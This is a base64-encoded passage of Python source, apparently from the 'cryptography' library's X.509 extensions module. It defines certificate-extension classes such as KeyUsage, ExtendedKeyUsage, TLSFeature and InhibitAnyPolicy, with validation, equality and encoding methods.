Il0sXHJcbiAgICAgICAgZXhwbGljaXRfdGV4dDogdHlwaW5nLk9wdGlvbmFsW3N0cl0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90aWNlX3JlZmVyZW5jZSBhbmQgbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIG5vdGljZV9yZWZlcmVuY2UsIE5vdGljZVJlZmVyZW5jZVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJub3RpY2VfcmVmZXJlbmNlIG11c3QgYmUgTm9uZSBvciBhIE5vdGljZVJlZmVyZW5jZSJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl9ub3RpY2VfcmVmZXJlbmNlID0gbm90aWNlX3JlZmVyZW5jZVxyXG4gICAgICAgIHNlbGYuX2V4cGxpY2l0X3RleHQgPSBleHBsaWNpdF90ZXh0XHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICAiPFVzZXJOb3RpY2Uobm90aWNlX3JlZmVyZW5jZT17MC5ub3RpY2VfcmVmZXJlbmNlfSwgZXhwbGljaXRfdGV4dD0iXHJcbiAgICAgICAgICAgICJ7MC5leHBsaWNpdF90ZXh0IXJ9KT4iLmZvcm1hdChzZWxmKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIFVzZXJOb3RpY2UpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5ub3RpY2VfcmVmZXJlbmNlID09IG90aGVyLm5vdGljZV9yZWZlcmVuY2VcclxuICAgICAgICAgICAgYW5kIHNlbGYuZXhwbGljaXRfdGV4dCA9PSBvdGhlci5leHBsaWNpdF90ZXh0XHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goKHNlbGYubm90aWNlX3JlZmVyZW5jZSwgc2VsZi5leHBsaWNpdF90ZXh0KSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBub3RpY2VfcmVmZXJlbmNlKHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFsiTm90aWNlUmVmZXJlbmNlIl06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX25vdGljZV9yZWZlcmVuY2VcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBleHBsaWNpdF90ZXh0KHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFtzdHJdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9leHBsaWNpdF90ZXh0XHJcblxyXG5cclxuY2xhc3MgTm90aWNlUmVmZXJlbmNlOlxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgb3JnYW5pemF0aW9uOiB0eXBpbmcuT3B0aW9uYWxbc3RyXSxcclxuICAgICAgICBub3RpY2VfbnVtYmVyczogdHlwaW5nLkl0ZXJhYmxlW2ludF0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fb3JnYW5pemF0aW9uID0gb3JnYW5pemF0aW9uXHJcbiAgICAgICAgbm90aWNlX251bWJlcnMgPSBsaXN0KG5vdGljZV9udW1iZXJzKVxyXG4gICAgICAgIGlmIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBpbnQpIGZvciB4IGluIG5vdGljZV9udW1iZXJzKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJub3RpY2VfbnVtYmVycyBtdXN0IGJlIGEgbGlzdCBvZiBpbnRlZ2VycyIpXHJcblxyXG4gICAgICAgIHNlbGYuX25vdGljZV9udW1iZXJzID0gbm90aWNlX251bWJlcnNcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgICI8Tm90aWNlUmVmZXJlbmNlKG9yZ2FuaXphdGlvbj17MC5vcmdhbml6YXRpb24hcn0sIG5vdGljZV9udW1iZXJzPSJcclxuICAgICAgICAgICAgInswLm5vdGljZV9udW1iZXJzfSk+Ii5mb3JtYXQoc2VsZilcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBOb3RpY2VSZWZlcmVuY2UpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5vcmdhbml6YXRpb24gPT0gb3RoZXIub3JnYW5pemF0aW9uXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLm5vdGljZV9udW1iZXJzID09IG90aGVyLm5vdGljZV9udW1iZXJzXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goKHNlbGYub3JnYW5pemF0aW9uLCB0dXBsZShzZWxmLm5vdGljZV9udW1iZXJzKSkpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb3JnYW5pemF0aW9uKHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFtzdHJdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vcmdhbml6YXRpb25cclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBub3RpY2VfbnVtYmVycyhzZWxmKSAtPiB0eXBpbmcuTGlzdFtpbnRdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9ub3RpY2VfbnVtYmVyc1xyXG5cclxuXHJcbmNsYXNzIEV4dGVuZGVkS2V5VXNhZ2UoRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuRVhURU5ERURfS0VZX1VTQUdFXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHVzYWdlczogdHlwaW5nLkl0ZXJhYmxlW09iamVjdElkZW50aWZpZXJdKSAtPiBOb25lOlxyXG4gICAgICAgIHVzYWdlcyA9IGxpc3QodXNhZ2VzKVxyXG4gICAgICAgIGlmIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBPYmplY3RJZGVudGlmaWVyKSBmb3IgeCBpbiB1c2FnZXMpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiRXZlcnkgaXRlbSBpbiB0aGUgdXNhZ2VzIGxpc3QgbXVzdCBiZSBhbiBPYmplY3RJZGVudGlmaWVyIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3VzYWdlcyA9IHVzYWdlc1xyXG5cclxuICAgIF9fbGVuX18sIF9faXRlcl9fLCBfX2dldGl0ZW1fXyA9IF9tYWtlX3NlcXVlbmNlX21ldGhvZHMoIl91c2FnZXMiKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8RXh0ZW5kZWRLZXlVc2FnZSh7fSk+Ii5mb3JtYXQoc2VsZi5fdXNhZ2VzKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgRXh0ZW5kZWRLZXlVc2FnZSk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fdXNhZ2VzID09IG90aGVyLl91c2FnZXNcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHR1cGxlKHNlbGYuX3VzYWdlcykpXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBPQ1NQTm9DaGVjayhFeHRlbnNpb25UeXBlKTpcclxuICAgIG9pZCA9IEV4dGVuc2lvbk9JRC5PQ1NQX05PX0NIRUNLXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBPQ1NQTm9DaGVjayk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gVHJ1ZVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goT0NTUE5vQ2hlY2spXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxPQ1NQTm9DaGVjaygpPiJcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIFByZWNlcnRQb2lzb24oRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuUFJFQ0VSVF9QT0lTT05cclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIFByZWNlcnRQb2lzb24pOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKFByZWNlcnRQb2lzb24pXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxQcmVjZXJ0UG9pc29uKCk+IlxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgVExTRmVhdHVyZShFeHRlbnNpb25UeXBlKTpcclxuICAgIG9pZCA9IEV4dGVuc2lvbk9JRC5UTFNfRkVBVFVSRVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBmZWF0dXJlczogdHlwaW5nLkl0ZXJhYmxlWyJUTFNGZWF0dXJlVHlwZSJdKSAtPiBOb25lOlxyXG4gICAgICAgIGZlYXR1cmVzID0gbGlzdChmZWF0dXJlcylcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBUTFNGZWF0dXJlVHlwZSkgZm9yIHggaW4gZmVhdHVyZXMpXHJcbiAgICAgICAgICAgIG9yIGxlbihmZWF0dXJlcykgPT0gMFxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJmZWF0dXJlcyBtdXN0IGJlIGEgbGlzdCBvZiBlbGVtZW50cyBmcm9tIHRoZSBUTFNGZWF0dXJlVHlwZSAiXHJcbiAgICAgICAgICAgICAgICAiZW51bSJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl9mZWF0dXJlcyA9IGZlYXR1cmVzXHJcblxyXG4gICAgX19sZW5fXywgX19pdGVyX18sIF9fZ2V0aXRlbV9fID0gX21ha2Vfc2VxdWVuY2VfbWV0aG9kcygiX2ZlYXR1cmVzIilcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPFRMU0ZlYXR1cmUoZmVhdHVyZXM9ezAuX2ZlYXR1cmVzfSk+Ii5mb3JtYXQoc2VsZilcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIFRMU0ZlYXR1cmUpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2ZlYXR1cmVzID09IG90aGVyLl9mZWF0dXJlc1xyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2godHVwbGUoc2VsZi5fZmVhdHVyZXMpKVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgVExTRmVhdHVyZVR5cGUodXRpbHMuRW51bSk6XHJcbiAgICAjIHN0YXR1c19yZXF1ZXN0IGlzIGRlZmluZWQgaW4gUkZDIDYwNjYgYW5kIGlzIHVzZWQgZm9yIHdoYXQgaXMgY29tbW9ubHlcclxuICAgICMgY2FsbGVkIE9DU1AgTXVzdC1TdGFwbGUgd2hlbiBwcmVzZW50IGluIHRoZSBUTFMgRmVhdHVyZSBleHRlbnNpb24gaW4gYW5cclxuICAgICMgWC41MDkgY2VydGlmaWNhdGUuXHJcbiAgICBzdGF0dXNfcmVxdWVzdCA9IDVcclxuICAgICMgc3RhdHVzX3JlcXVlc3RfdjIgaXMgZGVmaW5lZCBpbiBSRkMgNjk2MSBhbmQgYWxsb3dzIG11bHRpcGxlIE9DU1BcclxuICAgICMgcmVzcG9uc2VzIHRvIGJlIHByb3ZpZGVkLiBJdCBpcyBub3QgY3VycmVudGx5IGluIHVzZSBieSBjbGllbnRzIG9yXHJcbiAgICAjIHNlcnZlcnMuXHJcbiAgICBzdGF0dXNfcmVxdWVzdF92MiA9IDE3XHJcblxyXG5cclxuX1RMU19GRUFUVVJFX1RZUEVfVE9fRU5VTSA9IHt4LnZhbHVlOiB4IGZvciB4IGluIFRMU0ZlYXR1cmVUeXBlfVxyXG5cclxuXHJcbmNsYXNzIEluaGliaXRBbnlQb2xpY3koRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuSU5ISUJJVF9BTllfUE9MSUNZXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHNraXBfY2VydHM6IGludCkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShza2lwX2NlcnRzLCBpbnQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInNraXBfY2VydHMgbXVzdCBiZSBhbiBpbnRlZ2VyIilcclxuXHJcbiAgICAgICAgaWYgc2tpcF9jZXJ0cyA8IDA6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoInNraXBfY2VydHMgbXVzdCBiZSBhIG5vbi1uZWdhdGl2ZSBpbnRlZ2VyIilcclxuXHJcbiAgICAgICAgc2VsZi5fc2tpcF9jZXJ0cyA9IHNraXBfY2VydHNcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPEluaGliaXRBbnlQb2xpY3koc2tpcF9jZXJ0cz17MC5za2lwX2NlcnRzfSk+Ii5mb3JtYXQoc2VsZilcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIEluaGliaXRBbnlQb2xpY3kpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuc2tpcF9jZXJ0cyA9PSBvdGhlci5za2lwX2NlcnRzXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaChzZWxmLnNraXBfY2VydHMpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgc2tpcF9jZXJ0cyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3NraXBfY2VydHNcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIEtleVVzYWdlKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gRXh0ZW5zaW9uT0lELktFWV9VU0FHRVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGRpZ2l0YWxfc2lnbmF0dXJlOiBib29sLFxyXG4gICAgICAgIGNvbnRlbnRfY29tbWl0bWVudDogYm9vbCxcclxuICAgICAgICBrZXlfZW5jaXBoZXJtZW50OiBib29sLFxyXG4gICAgICAgIGRhdGFfZW5jaXBoZXJtZW50OiBib29sLFxyXG4gICAgICAgIGtleV9hZ3JlZW1lbnQ6IGJvb2wsXHJcbiAgICAgICAga2V5X2NlcnRfc2lnbjogYm9vbCxcclxuICAgICAgICBjcmxfc2lnbjogYm9vbCxcclxuICAgICAgICBlbmNpcGhlcl9vbmx5OiBib29sLFxyXG4gICAgICAgIGRlY2lwaGVyX29ubHk6IGJvb2wsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGtleV9hZ3JlZW1lbnQgYW5kIChlbmNpcGhlcl9vbmx5IG9yIGRlY2lwaGVyX29ubHkpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgImVuY2lwaGVyX29ubHkgYW5kIGRlY2lwaGVyX29ubHkgY2FuIG9ubHkgYmUgdHJ1ZSB3aGVuICJcclxuICAgICAgICAgICAgICAgICJrZXlfYWdyZWVtZW50IGlzIHRydWUiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fZGlnaXRhbF9zaWduYXR1cmUgPSBkaWdpdGFsX3NpZ25hdHVyZVxyXG4gICAgICAgIHNlbGYuX2NvbnRlbnRfY29tbWl0bWVudCA9IGNvbnRlbnRfY29tbWl0bWVudFxyXG4gICAgICAgIHNlbGYuX2tleV9lbmNpcGhlcm1lbnQgPSBrZXlfZW5jaXBoZXJtZW50XHJcbiAgICAgICAgc2VsZi5fZGF0YV9lbmNpcGhlcm1lbnQgPSBkYXRhX2VuY2lwaGVybWVudFxyXG4gICAgICAgIHNlbGYuX2tleV9hZ3JlZW1lbnQgPSBrZXlfYWdyZWVtZW50XHJcbiAgICAgICAgc2VsZi5fa2V5X2NlcnRfc2lnbiA9IGtleV9jZXJ0X3NpZ25cclxuICAgICAgICBzZWxmLl9jcmxfc2lnbiA9IGNybF9zaWduXHJcbiAgICAgICAgc2VsZi5fZW5jaXBoZXJfb25seSA9IGVuY2lwaGVyX29ubHlcclxuICAgICAgICBzZWxmLl9kZWNpcGhlcl9vbmx5ID0gZGVjaXBoZXJfb25seVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGRpZ2l0YWxfc2lnbmF0dXJlKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2RpZ2l0YWxfc2lnbmF0dXJlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY29udGVudF9jb21taXRtZW50KHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2NvbnRlbnRfY29tbWl0bWVudFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9lbmNpcGhlcm1lbnQoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fa2V5X2VuY2lwaGVybWVudFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGRhdGFfZW5jaXBoZXJtZW50KHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2RhdGFfZW5jaXBoZXJtZW50XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYga2V5X2FncmVlbWVudChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9rZXlfYWdyZWVtZW50XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYga2V5X2NlcnRfc2lnbihzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9rZXlfY2VydF9zaWduXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY3JsX3NpZ24oc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY3JsX3NpZ25cclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBlbmNpcGhlcl9vbmx5KHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IHNlbGYua2V5X2FncmVlbWVudDpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJlbmNpcGhlcl9vbmx5IGlzIHVuZGVmaW5lZCB1bmxlc3Mga2V5X2FncmVlbWVudCBpcyB0cnVlIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2VuY2lwaGVyX29ubHlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBkZWNpcGhlcl9vbmx5KHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IHNlbGYua2V5X2FncmVlbWVudDpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJkZWNpcGhlcl9vbmx5IGlzIHVuZGVmaW5lZCB1bmxlc3Mga2V5X2FncmVlbWVudCBpcyB0cnVlIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2RlY2lwaGVyX29ubHlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgZW5jaXBoZXJfb25seSA9IHNlbGYuZW5jaXBoZXJfb25seVxyXG4gICAgICAgICAgICBkZWNpcGhlcl9vbmx5ID0gc2VsZi5kZWNpcGhlcl9vbmx5XHJcbiAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6XHJcbiAgICAgICAgICAgICMgVXNlcnMgZm91bmQgTm9uZSBjb25mdXNpbmcgYmVjYXVzZSBldmVuIHRob3VnaCBlbmNpcGhlci9kZWNpcGhlclxyXG4gICAgICAgICAgICAjIGhhdmUgbm8gbWVhbmluZyB1bmxlc3Mga2V5X2FncmVlbWVudCBpcyB0cnVlLCB0byBjb25zdHJ1Y3QgYW5cclxuICAgICAgICAgICAgIyBpbnN0YW5jZSBvZiB0aGUgY2xhc3MgeW91IHN0aWxsIG5lZWQgdG8gcGFzcyBGYWxzZS5cclxuICAgICAgICAgICAgZW5jaXBoZXJfb25seSA9IEZhbHNlXHJcbiAgICAgICAgICAgIGRlY2lwaGVyX29ubHkgPSBGYWxzZVxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICAiPEtleVVzYWdlKGRpZ2l0YWxfc2lnbmF0dXJlPXswLmRpZ2l0YWxfc2lnbmF0dXJlfSwgIlxyXG4gICAgICAgICAgICAiY29udGVudF9jb21taXRtZW50PXswLmNvbnRlbnRfY29tbWl0bWVudH0sICJcclxuICAgICAgICAgICAgImtleV9lbmNpcGhlcm1lbnQ9ezAua2V5X2VuY2lwaGVybWVudH0sICJcclxuICAgICAgICAgICAgImRhdGFfZW5jaXBoZXJtZW50PXswLmRhdGFfZW5jaXBoZXJtZW50fSwgIlxyXG4gICAgICAgICAgICAia2V5X2FncmVlbWVudD17MC5rZXlfYWdyZWVtZW50fSwgIlxyXG4gICAgICAgICAgICAia2V5X2NlcnRfc2lnbj17MC5rZXlfY2VydF9zaWdufSwgY3JsX3NpZ249ezAuY3JsX3NpZ259LCAiXHJcbiAgICAgICAgICAgICJlbmNpcGhlcl9vbmx5PXsxfSwgZGVjaXBoZXJfb25seT17Mn0pPiJcclxuICAgICAgICApLmZvcm1hdChzZWxmLCBlbmNpcGhlcl9vbmx5LCBkZWNpcGhlcl9vbmx5KVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgS2V5VXNhZ2UpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5kaWdpdGFsX3NpZ25hdHVyZSA9PSBvdGhlci5kaWdpdGFsX3NpZ25hdHVyZVxyXG4gICAgICAgICAgICBhbmQgc2VsZi5jb250ZW50X2NvbW1pdG1lbnQgPT0gb3RoZXIuY29udGVudF9jb21taXRtZW50XHJcbiAgICAgICAgICAgIGFuZCBzZWxmLmtleV9lbmNpcGhlcm1lbnQgPT0gb3RoZXIua2V5X2VuY2lwaGVybWVudFxyXG4gICAgICAgICAgICBhbmQgc2VsZi5kYXRhX2VuY2lwaGVybWVudCA9PSBvdGhlci5kYXRhX2VuY2lwaGVybWVudFxyXG4gICAgICAgICAgICBhbmQgc2VsZi5rZXlfYWdyZWVtZW50ID09IG90aGVyLmtleV9hZ3JlZW1lbnRcclxuICAgICAgICAgICAgYW5kIHNlbGYua2V5X2NlcnRfc2lnbiA9PSBvdGhlci5rZXlfY2VydF9zaWduXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLmNybF9zaWduID09IG90aGVyLmNybF9zaWduXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLl9lbmNpcGhlcl9vbmx5ID09IG90aGVyLl9lbmNpcGhlcl9vbmx5XHJcbiAgICAgICAgICAgIGFuZCBzZWxmLl9kZWNpcGhlcl9vbmx5ID09IG90aGVyLl9kZWNpcGhlcl9vbmx5XHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goXHJcbiAgICAgICAgICAgIChcclxuICAgICAgICAgICAgICAgIHNlbGYuZGlnaXRhbF9zaWduYXR1cmUsXHJcbiAgICAgICAgICAgICAgICBzZWxmLmNvbnRlbnRfY29tbWl0bWVudCxcclxuICAgICAgICAgICAgICAgIHNlbGYua2V5X2VuY2lwaGVybWVudCxcclxuICAgICAgICAgICAgICAgIHNlbGYuZGF0YV9lbmNpcGhlcm1lbnQsXHJcbiAgICAgICAgICAgICAgICBzZWxmLmtleV9hZ3JlZW1lbnQsXHJcbiAgICAgICAgICAgICAgICBzZWxmLmtleV9jZXJ0X3NpZ24sXHJcbiAgICAgICAgICAgICAgICBzZWxmLmNybF9zaWduLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fZW5jaXBoZXJfb25seSxcclxuICAgICAgICAgICAgICAgIHNlbGYuX2RlY2lwaGVyX29ubHksXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBOYW1lQ29uc3RyYWludHMoRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuTkFNRV9DT05TVFJBSU5UU1xyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHBlcm1pdHRlZF9zdWJ0cmVlczogdHlwaW5nLk9wdGlvbmFsW3R5cGluZy5JdGVyYWJsZVtHZW5lcmFsTmFtZV1dLFxyXG4gICAgICAgIGV4Y2x1ZGVkX3N1YnRyZWVzOiB0eXBpbmcuT3B0aW9uYWxbdHlwaW5nLkl0ZXJhY